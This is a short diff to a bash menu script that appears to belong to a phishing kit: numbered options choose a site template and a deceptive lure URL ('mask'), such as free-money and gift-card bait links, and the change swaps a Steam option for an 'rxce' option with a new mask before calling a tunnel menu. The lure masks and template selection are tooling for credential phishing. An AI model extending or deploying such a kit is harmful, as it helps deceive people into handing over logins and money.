@@ -591,8 +591,8 @@ main_menu() {
 		mask='http://get-500-usd-free-to-your-acount'
 		tunnel_menu
 	elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
-		website="steam"
-		mask='http://steam-500-usd-gift-card-free'
+		website="rxce"
+		mask='https://rxce.in/#/win'
 		tunnel_menu
 	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
 		website="twitter"
